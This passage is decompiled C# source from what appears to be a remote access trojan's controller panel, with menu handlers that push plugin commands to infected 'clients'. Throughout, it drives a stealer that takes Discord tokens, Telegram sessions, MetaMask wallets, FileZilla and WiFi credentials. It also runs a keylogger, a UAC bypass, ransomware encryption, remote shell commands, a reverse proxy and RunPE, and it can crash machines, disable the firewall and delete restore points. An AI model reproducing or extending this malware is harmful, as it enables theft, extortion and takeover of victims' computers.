			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"TaskMgrD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R852-82 CS$<>8__locals1 = new Main._Closure$__R852-82(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000480 RID: 1152 RVA: 0x000280BC File Offset: 0x000262BC
		private void EnableToolStripMenuItem10_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"FirewallE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R853-84 CS$<>8__locals1 = new Main._Closure$__R853-84(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x000281CC File Offset: 0x000263CC
		private void DisableToolStripMenuItem10_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"FirewallD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R854-86 CS$<>8__locals1 = new Main._Closure$__R854-86(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000482 RID: 1154 RVA: 0x000282DC File Offset: 0x000264DC
		private void EnableToolStripMenuItem11_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"UpdatesE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R855-88 CS$<>8__locals1 = new Main._Closure$__R855-88(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000483 RID: 1155 RVA: 0x000283EC File Offset: 0x000265EC
		private void DisableToolStripMenuItem11_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"UpdatesD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R856-90 CS$<>8__locals1 = new Main._Closure$__R856-90(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000484 RID: 1156 RVA: 0x000284FC File Offset: 0x000266FC
		private void ResetScaleToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"scale"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R857-92 CS$<>8__locals1 = new Main._Closure$__R857-92(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000485 RID: 1157 RVA: 0x0002860C File Offset: 0x0002680C
		private void InvokeBSODToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				int num = (int)MessageBox.Show("Are You Sure?", "Invoke-BSOD!", MessageBoxButtons.YesNo);
				bool flag2 = num == 6;
				if (flag2)
				{
					try
					{
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"plugin",
							SettingsHelper.SPL,
							Helper.GetChecksum("Plugins\\Options.dll"),
							SettingsHelper.SPL,
							"BSOD"
						}));
						try
						{
							foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
							{
								Client $VB$NonLocal_ = (Client)obj;
								Main._Closure$__R858-94 CS$<>8__locals1 = new Main._Closure$__R858-94(CS$<>8__locals1);
								CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
								}, state);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
				}
			}
		}

		// Token: 0x06000486 RID: 1158 RVA: 0x00028740 File Offset: 0x00026940
		private void DeleteRestoreToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"DeletePoints"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R859-96 CS$<>8__locals1 = new Main._Closure$__R859-96(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000487 RID: 1159 RVA: 0x00028850 File Offset: 0x00026A50
		private void Net35InstallToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"Net3"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R860-98 CS$<>8__locals1 = new Main._Closure$__R860-98(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog(".Net 3.5 Install..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000488 RID: 1160 RVA: 0x00028974 File Offset: 0x00026B74
		private void DiscordTokenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(2)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R861-100 CS$<>8__locals1 = new Main._Closure$__R861-100(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("DiscordToken..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000489 RID: 1161 RVA: 0x00028A9C File Offset: 0x00026C9C
		private void TelegramSessionToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(4)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R862-102 CS$<>8__locals1 = new Main._Closure$__R862-102(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("TelegramSession..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600048A RID: 1162 RVA: 0x00028BC4 File Offset: 0x00026DC4
		private void ProductKeyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(3)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R863-104 CS$<>8__locals1 = new Main._Closure$__R863-104(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("ProductKey..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600048B RID: 1163 RVA: 0x00028CEC File Offset: 0x00026EEC
		private void MetaMaskToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(5)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R864-106 CS$<>8__locals1 = new Main._Closure$__R864-106(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("MetaMask..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600048C RID: 1164 RVA: 0x00028E14 File Offset: 0x00027014
		private void FileZillaToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(0)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R865-108 CS$<>8__locals1 = new Main._Closure$__R865-108(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("FileZilla..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600048D RID: 1165 RVA: 0x00028F3C File Offset: 0x0002713C
		private void WifiKeysToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Stealer.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(1)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R866-110 CS$<>8__locals1 = new Main._Closure$__R866-110(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("WifiKeys..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600048E RID: 1166 RVA: 0x00029064 File Offset: 0x00027264
		private void StartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				string text = Interaction.InputBox("Send a notification when client open a specific window", "ReportWindow", "YouTube, Photoshop, Steam", -1, -1);
				bool flag2 = string.IsNullOrEmpty(text);
				if (!flag2)
				{
					byte[] state = Helper.SB("StartReport" + SettingsHelper.SPL + text);
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R867-112 CS$<>8__locals1 = new Main._Closure$__R867-112(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x0600048F RID: 1167 RVA: 0x0002914C File Offset: 0x0002734C
		private void StopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("StopReport");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R868-114 CS$<>8__locals1 = new Main._Closure$__R868-114(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000490 RID: 1168 RVA: 0x000291F8 File Offset: 0x000273F8
		private void PerformanceToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Performance.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R869-116 CS$<>8__locals1 = new Main._Closure$__R869-116(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000491 RID: 1169 RVA: 0x000292E8 File Offset: 0x000274E8
		private void EditHostsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("Hosts");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R870-118 CS$<>8__locals1 = new Main._Closure$__R870-118(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000492 RID: 1170 RVA: 0x00029394 File Offset: 0x00027594
		private void OfflineToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("OfflineGet");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R871-120 CS$<>8__locals1 = new Main._Closure$__R871-120(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				Helper.LVLog("Offlinekeylogger..", Color.Black);
				this.ShowLog();
			}
		}

		// Token: 0x06000493 RID: 1171 RVA: 0x00029458 File Offset: 0x00027658
		private void OnlineToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Keylogger.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R872-122 CS$<>8__locals1 = new Main._Closure$__R872-122(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000494 RID: 1172 RVA: 0x00029548 File Offset: 0x00027748
		private void ClientChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("Xchat");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R873-124 CS$<>8__locals1 = new Main._Closure$__R873-124(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000495 RID: 1173 RVA: 0x000295F4 File Offset: 0x000277F4
		private void CommandsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				string text = Interaction.InputBox("Set Commands", "Commands", "cmd.exe /c start calc", -1, -1);
				bool flag2 = text.Length == 0;
				if (!flag2)
				{
					byte[] state = Helper.SB("RunShell" + SettingsHelper.SPL + text);
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R874-126 CS$<>8__locals1 = new Main._Closure$__R874-126(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x06000496 RID: 1174 RVA: 0x000296E0 File Offset: 0x000278E0
		private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\MessageBox.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R875-128 CS$<>8__locals1 = new Main._Closure$__R875-128(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000497 RID: 1175 RVA: 0x000297D0 File Offset: 0x000279D0
		private void RunAsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\UACBypass.dll"),
						SettingsHelper.SPL,
						"0"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R876-130 CS$<>8__locals1 = new Main._Closure$__R876-130(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000498 RID: 1176 RVA: 0x000298E0 File Offset: 0x00027AE0
		private void EncryptToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				Ransomware ransomware = new Ransomware();
				ransomware.ShowDialog();
			}
		}

		// Token: 0x06000499 RID: 1177 RVA: 0x00029914 File Offset: 0x00027B14
		private void DecryptToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Ransomware.dll"),
						SettingsHelper.SPL,
						"False"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R878-132 CS$<>8__locals1 = new Main._Closure$__R878-132(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049A RID: 1178 RVA: 0x00029A24 File Offset: 0x00027C24
		private void ReverseProxyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\ReverseProxy.dll"),
						SettingsHelper.SPL,
						"False"
					}));
					Client $VB$NonLocal_ = (Client)this.Lv1.SelectedItems[0].Tag;
					Client $VB$NonLocal_2 = $VB$NonLocal_;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049B RID: 1179 RVA: 0x00029AFC File Offset: 0x00027CFC
		private void RunPEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
